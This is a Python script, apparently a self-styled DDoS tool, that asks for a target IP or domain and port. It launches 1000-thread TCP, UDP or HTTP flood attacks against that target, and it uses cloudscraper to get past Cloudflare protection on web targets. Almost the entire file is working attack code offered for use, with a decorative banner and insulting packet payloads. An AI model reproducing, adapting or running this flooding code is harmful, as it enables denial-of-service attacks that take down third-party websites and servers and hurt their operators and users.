# Python Code By VanDuc Copyright By Human_PC
import socket
import threading
import requests
import cloudscraper
import random
import os
os.system("clear")
scraper = cloudscraper.create_scraper()

headers = {
    'Accept': 'application/json',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Accept-Encoding': 'gzip, deflate, br',
    'Referer': 'https://google.com'
}

colors = [
    "\033[91m", 
    "\033[92m",  
    "\033[93m", 
    "\033[94m", 
    "\033[95m",  
    "\033[96m",  
    "\033[97m", 
]

blacklist = [
    '192.168.1.10',  
    '192.168.1.20',
    '10.0.0.0', 
    '10.255.255.255',
    '172.16.0.0', 
    '172.31.255.255',
    '192.168.0.0',
    '192.168.255.255',
]

luong = 99999999

def blackip(ip):
    return ip in blacklist
print("""
   \x1b[38;2;251;4;240m·\x1b[38;2;251;8;240m▄\x1b[38;2;251;12;240m▄\x1b[38;2;251;16;240m▄\x1b[38;2;251;19;240m▄\x1b[38;2;251;23;240m \x1b[38;2;251;27;240m \x1b[38;2;251;31;240m·\x1b[38;2;251;34;240m▄\x1b[38;2;251;38;241m▄\x1b[38;2;251;42;241m▄\x1b[38;2;251;46;241m▄\x1b[38;2;251;49;241m \x1b[38;2;250;53;241m \x1b[38;2;250;57;241m \x1b[38;2;250;61;241m \x1b[38;2;250;64;241m \x1b[38;2;250;68;241m \x1b[38;2;250;72;242m \x1b[38;2;250;76;242m \x1b[38;2;250;79;242m.\x1b[38;2;250;83;242m▄\x1b[38;2;250;87;242m▄\x1b[38;2;250;90;242m \x1b[38;2;250;94;242m·\x1b[38;2;249;98;242m \x1b[38;2;249;102;242m \x1b[38;2;249;105;243m \x1b[38;2;249;109;243m \x1b[38;2;249;113;243m \x1b[38;2;249;117;243m \x1b[38;2;249;120;243m▄\x1b[38;2;249;124;243m▄\x1b[38;2;249;128;243m▄\x1b[38;2;249;132;243m·\x1b[38;2;249;135;243m \x1b[38;2;249;139;244m▄\x1b[38;2;249;143;244m▄\x1b[38;2;248;147;244m▄\x1b[38;2;248;150;244m▄\x1b[38;2;248;154;244m▄\x1b[38;2;248;158;244m▄\x1b[38;2;248;162;244m▄\x1b[38;2;248;165;244m▄\x1b[38;2;248;169;244m▄\x1b[38;2;248;173;245m▄\x1b[38;2;248;177;245m \x1b[38;2;248;180;245m▄\x1b[38;2;248;184;245m▄\x1b[38;2;248;188;245m▄\x1b[38;2;247;192;245m·\x1b[38;2;247;195;245m \x1b[38;2;247;199;245m \x1b[38;2;247;203;245m▄\x1b[38;2;247;207;246m▄\x1b[38;2;247;210;246m·\x1b[38;2;247;214;246m \x1b[38;2;247;218;246m▄\x1b[38;2;247;222;246m \x1b[38;2;247;225;246m•\x1b[38;2;247;229;246m▄\x1b[38;2;247;233;246m \x1b[38;2;247;237;247m
   \x1b[38;2;251;4;240m█\x1b[38;2;251;8;240m█\x1b[38;2;251;12;240m▪\x1b[38;2;251;16;240m \x1b[38;2;251;19;240m█\x1b[38;2;251;23;240m█\x1b[38;2;251;27;240m \x1b[38;2;251;31;240m█\x1b[38;2;251;34;240m█\x1b[38;2;251;38;241m▪\x1b[38;2;251;42;241m \x1b[38;2;251;46;241m█\x1b[38;2;251;49;241m█\x1b[38;2;250;53;241m \x1b[38;2;250;57;241m▪\x1b[38;2;250;61;241m \x1b[38;2;250;64;241m \x1b[38;2;250;68;241m \x1b[38;2;250;72;242m \x1b[38;2;250;76;242m \x1b[38;2;250;79;242m▐\x1b[38;2;250;83;242m█\x1b[38;2;250;87;242m \x1b[38;2;250;90;242m▀\x1b[38;2;250;94;242m.\x1b[38;2;249;98;242m \x1b[38;2;249;102;242m \x1b[38;2;249;105;243m \x1b[38;2;249;109;243m \x1b[38;2;249;113;243m \x1b[38;2;249;117;243m▐\x1b[38;2;249;120;243m█\x1b[38;2;249;124;243m \x1b[38;2;249;128;243m▀\x1b[38;2;249;132;243m█\x1b[38;2;249;135;243m \x1b[38;2;249;139;244m•\x1b[38;2;249;143;244m█\x1b[38;2;248;147;244m█\x1b[38;2;248;150;244m \x1b[38;2;248;154;244m \x1b[38;2;248;158;244m•\x1b[38;2;248;162;244m█\x1b[38;2;248;165;244m█\x1b[38;2;248;169;244m \x1b[38;2;248;173;245m \x1b[38;2;248;177;245m▐\x1b[38;2;248;180;245m█\x1b[38;2;248;184;245m \x1b[38;2;248;188;245m▀\x1b[38;2;247;192;245m█\x1b[38;2;247;195;245m \x1b[38;2;247;199;245m▐\x1b[38;2;247;203;245m█\x1b[38;2;247;207;246m \x1b[38;2;247;210;246m▌\x1b[38;2;247;214;246m▪\x1b[38;2;247;218;246m█\x1b[38;2;247;222;246m▌\x1b[38;2;247;225;246m▄\x1b[38;2;247;229;246m▌\x1b[38;2;247;233;246m▪\x1b[38;2;247;237;247m
   \x1b[38;2;251;4;240m▐\x1b[38;2;251;8;240m█\x1b[38;2;251;12;240m·\x1b[38;2;251;16;240m \x1b[38;2;251;19;240m▐\x1b[38;2;251;23;240m█\x1b[38;2;251;27;240m▌\x1b[38;2;251;31;240m▐\x1b[38;2;251;34;240m█\x1b[38;2;251;38;241m·\x1b[38;2;251;42;241m \x1b[38;2;251;46;241m▐\x1b[38;2;251;49;241m█\x1b[38;2;250;53;241m▌\x1b[38;2;250;57;241m \x1b[38;2;250;61;241m▄\x1b[38;2;250;64;241m█\x1b[38;2;250;68;241m▀\x1b[38;2;250;72;242m▄\x1b[38;2;250;76;242m \x1b[38;2;250;79;242m▄\x1b[38;2;250;83;242m▀\x1b[38;2;250;87;242m▀\x1b[38;2;250;90;242m▀\x1b[38;2;250;94;242m█\x1b[38;2;249;98;242m▄\x1b[38;2;249;102;242m \x1b[38;2;249;105;243m \x1b[38;2;249;109;243m \x1b[38;2;249;113;243m \x1b[38;2;249;117;243m▄\x1b[38;2;249;120;243m█\x1b[38;2;249;124;243m▀\x1b[38;2;249;128;243m▀\x1b[38;2;249;132;243m█\x1b[38;2;249;135;243m \x1b[38;2;249;139;244m \x1b[38;2;249;143;244m▐\x1b[38;2;248;147;244m█\x1b[38;2;248;150;244m.\x1b[38;2;248;154;244m▪\x1b[38;2;248;158;244m \x1b[38;2;248;162;244m▐\x1b[38;2;248;165;244m█\x1b[38;2;248;169;244m.\x1b[38;2;248;173;245m▪\x1b[38;2;248;177;245m▄\x1b[38;2;248;180;245m█\x1b[38;2;248;184;245m▀\x1b[38;2;248;188;245m▀\x1b[38;2;247;192;245m█\x1b[38;2;247;195;245m \x1b[38;2;247;199;245m█\x1b[38;2;247;203;245m█\x1b[38;2;247;207;246m \x1b[38;2;247;210;246m▄\x1b[38;2;247;214;246m▄\x1b[38;2;247;218;246m▐\x1b[38;2;247;222;246m▀\x1b[38;2;247;225;246m▀\x1b[38;2;247;229;246m▄\x1b[38;2;247;233;246m·\x1b[38;2;247;237;247m
   \x1b[38;2;251;4;240m█\x1b[38;2;251;8;240m█\x1b[38;2;251;12;240m.\x1b[38;2;251;16;240m \x1b[38;2;251;19;240m█\x1b[38;2;251;23;240m█\x1b[38;2;251;27;240m \x1b[38;2;251;31;240m█\x1b[38;2;251;34;240m█\x1b[38;2;251;38;241m.\x1b[38;2;251;42;241m \x1b[38;2;251;46;241m█\x1b[38;2;251;49;241m█\x1b[38;2;250;53;241m \x1b[38;2;250;57;241m▐\x1b[38;2;250;61;241m█\x1b[38;2;250;64;241m▌\x1b[38;2;250;68;241m.\x1b[38;2;250;72;242m▐\x1b[38;2;250;76;242m▌\x1b[38;2;250;79;242m▐\x1b[38;2;250;83;242m█\x1b[38;2;250;87;242m▄\x1b[38;2;250;90;242m▪\x1b[38;2;250;94;242m▐\x1b[38;2;249;98;242m█\x1b[38;2;249;102;242m \x1b[38;2;249;105;243m \x1b[38;2;249;109;243m \x1b[38;2;249;113;243m \x1b[38;2;249;117;243m▐\x1b[38;2;249;120;243m█\x1b[38;2;249;124;243m \x1b[38;2;249;128;243m▪\x1b[38;2;249;132;243m▐\x1b[38;2;249;135;243m▌\x1b[38;2;249;139;244m \x1b[38;2;249;143;244m▐\x1b[38;2;248;147;244m█\x1b[38;2;248;150;244m▌\x1b[38;2;248;154;244m·\x1b[38;2;248;158;244m \x1b[38;2;248;162;244m▐\x1b[38;2;248;165;244m█\x1b[38;2;248;169;244m▌\x1b[38;2;248;173;245m·\x1b[38;2;248;177;245m▐\x1b[38;2;248;180;245m█\x1b[38;2;248;184;245m \x1b[38;2;248;188;245m▪\x1b[38;2;247;192;245m▐\x1b[38;2;247;195;245m▌\x1b[38;2;247;199;245m▐\x1b[38;2;247;203;245m█\x1b[38;2;247;207;246m█\x1b[38;2;247;210;246m█\x1b[38;2;247;214;246m▌\x1b[38;2;247;218;246m▐\x1b[38;2;247;222;246m█\x1b[38;2;247;225;246m.\x1b[38;2;247;229;246m█\x1b[38;2;247;233;246m▌\x1b[38;2;247;237;247m
   \x1b[38;2;251;4;240m▀\x1b[38;2;251;8;240m▀\x1b[38;2;251;12;240m▀\x1b[38;2;251;16;240m▀\x1b[38;2;251;19;240m▀\x1b[38;2;251;23;240m•\x1b[38;2;251;27;240m \x1b[38;2;251;31;240m▀\x1b[38;2;251;34;240m▀\x1b[38;2;251;38;241m▀\x1b[38;2;251;42;241m▀\x1b[38;2;251;46;241m▀\x1b[38;2;251;49;241m•\x1b[38;2;250;53;241m \x1b[38;2;250;57;241m \x1b[38;2;250;61;241m▀\x1b[38;2;250;64;241m█\x1b[38;2;250;68;241m▄\x1b[38;2;250;72;242m▀\x1b[38;2;250;76;242m▪\x1b[38;2;250;79;242m \x1b[38;2;250;83;242m▀\x1b[38;2;250;87;242m▀\x1b[38;2;250;90;242m▀\x1b[38;2;250;94;242m▀\x1b[38;2;249;98;242m \x1b[38;2;249;102;242m \x1b[38;2;249;105;243m \x1b[38;2;249;109;243m \x1b[38;2;249;113;243m \x1b[38;2;249;117;243m \x1b[38;2;249;120;243m▀\x1b[38;2;249;124;243m \x1b[38;2;249;128;243m \x1b[38;2;249;132;243m▀\x1b[38;2;249;135;243m \x1b[38;2;249;139;244m \x1b[38;2;249;143;244m▀\x1b[38;2;248;147;244m▀\x1b[38;2;248;150;244m▀\x1b[38;2;248;154;244m \x1b[38;2;248;158;244m \x1b[38;2;248;162;244m▀\x1b[38;2;248;165;244m▀\x1b[38;2;248;169;244m▀\x1b[38;2;248;173;245m \x1b[38;2;248;177;245m \x1b[38;2;248;180;245m▀\x1b[38;2;248;184;245m \x1b[38;2;248;188;245m \x1b[38;2;247;192;245m▀\x1b[38;2;247;195;245m \x1b[38;2;247;199;245m·\x1b[38;2;247;203;245m▀\x1b[38;2;247;207;246m▀\x1b[38;2;247;210;246m▀\x1b[38;2;247;214;246m \x1b[38;2;247;218;246m·\x1b[38;2;247;222;246m▀\x1b[38;2;247;225;246m \x1b[38;2;247;229;246m \x1b[38;2;247;233;246m▀\x1b[38;2;247;237;247m
                                                \x1b[38;2;251;8;240m[\x1b[38;2;251;19;240mS\x1b[38;2;251;30;240mo\x1b[38;2;251;41;241mu\x1b[38;2;250;51;241mr\x1b[38;2;250;62;241mc\x1b[38;2;250;73;242me\x1b[38;2;250;84;242m \x1b[38;2;250;95;242mB\x1b[38;2;249;106;243my\x1b[38;2;249;117;243m \x1b[38;2;249;128;243mP\x1b[38;2;249;139;244mh\x1b[38;2;248;149;244mu\x1b[38;2;248;160;244mV\x1b[38;2;248;171;245ma\x1b[38;2;248;182;245mn\x1b[38;2;247;193;245mD\x1b[38;2;247;204;246mu\x1b[38;2;247;215;246mc\x1b[38;2;247;226;246m]\x1b[38;2;247;237;247m\033[0m
                                             
 """)
def select():
    cnc = input("\x1b[38;2;251;10;240mE\x1b[38;2;251;25;240mn\x1b[38;2;251;40;241mt\x1b[38;2;250;55;241me\x1b[38;2;250;70;242mr\x1b[38;2;250;86;242m \x1b[38;2;249;101;242mL\x1b[38;2;249;116;243ma\x1b[38;2;249;131;243my\x1b[38;2;248;146;244me\x1b[38;2;248;161;244mr\x1b[38;2;248;176;245m7\x1b[38;2;247;191;245m/\x1b[38;2;247;206;246m4\x1b[38;2;247;221;246m:\x1b[38;2;247;237;247m\033[0m ")
    if cnc.lower() in ["l4", "4", "layer4"]:
       banner4()
    elif cnc.lower() in ["l7", "7", "layer7"]:
       banner7()

def layer7(url, port):            
    for _ in range(luong):
        try:
            attack_get = scraper.get(url, headers=headers)
            attack_post = scraper.post(url, headers=headers)
            status_code = attack_get.status_code            
            colorr = random.choice(colors)
            print(f"{colorr}Attack successfully sent to {url}:{port} | Status Code: {status_code}")            
        except Exception as e:
            print(f"Lỗi Mẹ Rồi :D")

def udp(ip, port):
    if blackip(ip):        
        return
    for _ in range(luong):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            yeucau = "Dit Me May Server Rach"
            sock.sendto(yeucau.encode(), (ip, port))
            colorr = random.choice(colors)
            print(f"{colorr}UDP Attack To => {ip}:{port}")
            sock.close()
        except Exception as e:
            print(f"Da Xay Ra Loi")

def tcp(ip, port):    
    if blackip(ip):
       return
    for _ in range(luong):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.connect((ip, port))
            request = "GET / HTTP/1.1\r\nHost: {}\r\n\r\n".format(ip)
            sock.send(request.encode())            
            colorr = random.choice(colors)
            print(f"{colorr}TCP Attack To => {ip}:{port}")
            sock.close()
        except Exception as e:
            print(f"Lỗi Rồi Bạn Ơi:)")

def banner4():
    ip = input("\x1b[38;2;251;8;240mE\x1b[38;2;251;19;240mn\x1b[38;2;251;30;240mt\x1b[38;2;251;41;241me\x1b[38;2;250;51;241mr\x1b[38;2;250;62;241m \x1b[38;2;250;73;242mY\x1b[38;2;250;84;242mo\x1b[38;2;250;95;242mu\x1b[38;2;249;106;243mr\x1b[38;2;249;117;243m \x1b[38;2;249;128;243mS\x1b[38;2;249;139;244me\x1b[38;2;248;149;244mr\x1b[38;2;248;160;244mv\x1b[38;2;248;171;245me\x1b[38;2;248;182;245mr\x1b[38;2;247;193;245m \x1b[38;2;247;204;246mI\x1b[38;2;247;215;246mP\x1b[38;2;247;226;246m:\x1b[38;2;247;237;247m\033[0m ")
    port = int(input("\x1b[38;2;251;10;240mE\x1b[38;2;251;24;240mn\x1b[38;2;251;38;241mt\x1b[38;2;250;52;241me\x1b[38;2;250;66;241mr\x1b[38;2;250;81;242m \x1b[38;2;250;95;242mY\x1b[38;2;249;109;243mo\x1b[38;2;249;123;243mu\x1b[38;2;249;137;244mr\x1b[38;2;248;151;244m \x1b[38;2;248;166;244mP\x1b[38;2;248;180;245mo\x1b[38;2;247;194;245mr\x1b[38;2;247;208;246mt\x1b[38;2;247;222;246m:\x1b[38;2;247;237;247m\033[0m "))
    layer = input("\x1b[38;2;251;6;240mS\x1b[38;2;251;14;240me\x1b[38;2;251;22;240ml\x1b[38;2;251;29;240me\x1b[38;2;251;37;241mc\x1b[38;2;251;45;241mt\x1b[38;2;250;52;241m \x1b[38;2;250;60;241mY\x1b[38;2;250;68;241mo\x1b[38;2;250;75;242mu\x1b[38;2;250;83;242mr\x1b[38;2;250;91;242m \x1b[38;2;249;98;242mM\x1b[38;2;249;106;243me\x1b[38;2;249;114;243mt\x1b[38;2;249;121;243mh\x1b[38;2;249;129;243mo\x1b[38;2;249;137;244md\x1b[38;2;248;144;244m \x1b[38;2;248;152;244m[\x1b[38;2;248;160;244mT\x1b[38;2;248;167;244mC\x1b[38;2;248;175;245mP\x1b[38;2;248;183;245m/\x1b[38;2;247;190;245mU\x1b[38;2;247;198;245mD\x1b[38;2;247;206;246mP\x1b[38;2;247;213;246m]\x1b[38;2;247;221;246m \x1b[38;2;247;229;246m:\x1b[38;2;247;237;247m\033[0m ")    
    thread_count = 1000
    threads = []
    if layer.lower() == "tcp":
        for _ in range(thread_count):
            thread = threading.Thread(target=tcp, args=(ip, port))
            threads.append(thread)
            thread.start()
    elif layer.lower() == "udp":
        for _ in range(thread_count):
            thread = threading.Thread(target=udp, args=(ip, port))
            threads.append(thread)
            thread.start()
    else:
        print("Huh Wtf?")
        return

    for thread in threads:
        thread.join()

def banner7():
    url = input("\x1b[38;2;251;9;240mE\x1b[38;2;251;21;240mn\x1b[38;2;251;34;240mt\x1b[38;2;251;47;241me\x1b[38;2;250;59;241mr\x1b[38;2;250;72;242m \x1b[38;2;250;85;242mY\x1b[38;2;249;97;242mo\x1b[38;2;249;110;243mu\x1b[38;2;249;123;243mr\x1b[38;2;249;135;243m \x1b[38;2;248;148;244mD\x1b[38;2;248;161;244mo\x1b[38;2;248;173;245mm\x1b[38;2;248;186;245ma\x1b[38;2;247;199;245mi\x1b[38;2;247;211;246mn\x1b[38;2;247;224;246m:\x1b[38;2;247;237;247m\033[0m ")
    port = int(input("\x1b[38;2;251;10;240mE\x1b[38;2;251;24;240mn\x1b[38;2;251;38;241mt\x1b[38;2;250;52;241me\x1b[38;2;250;66;241mr\x1b[38;2;250;81;242m \x1b[38;2;250;95;242mY\x1b[38;2;249;109;243mo\x1b[38;2;249;123;243mu\x1b[38;2;249;137;244mr\x1b[38;2;248;151;244m \x1b[38;2;248;166;244mP\x1b[38;2;248;180;245mo\x1b[38;2;247;194;245mr\x1b[38;2;247;208;246mt\x1b[38;2;247;222;246m:\x1b[38;2;247;237;247m\033[0m "))    
    thread_count = 1000
    threads = []

    for _ in range(thread_count):
        thread = threading.Thread(target=layer7, args=(url, port))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

select()